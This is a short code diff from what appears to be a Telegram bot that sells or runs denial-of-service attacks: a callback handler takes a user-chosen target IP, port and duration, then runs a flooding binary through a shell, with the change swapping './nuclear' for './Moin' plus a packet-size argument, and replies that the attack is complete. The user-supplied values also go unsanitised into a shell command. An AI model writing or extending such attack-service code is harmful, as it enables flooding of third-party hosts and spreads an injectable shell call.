@@ -408,7 +408,7 @@ def handle_duration_choice(call):
                 log_command(user_id, state['target'], state['port'], state['time'])
                 ongoing_attacks[user_id] = True
                 start_attack_reply(call.message, state['target'], state['port'], state['time'])
-                full_command = f"./nuclear {state['target']} {state['port']} {state['time']} "
+                full_command = f"./Moin {state['target']} {state['port']} {state['time']} 1450"
                 subprocess.run(full_command, shell=True)
                 bot.reply_to(call.message, f"🎊YOUR ATTACK HASH BEEN COMPLETE 🚀 {state['target']} 🚨PORT: {state['port']} ⌚DURATION: {state['time']} seconds")
                 del ongoing_attacks[user_id]
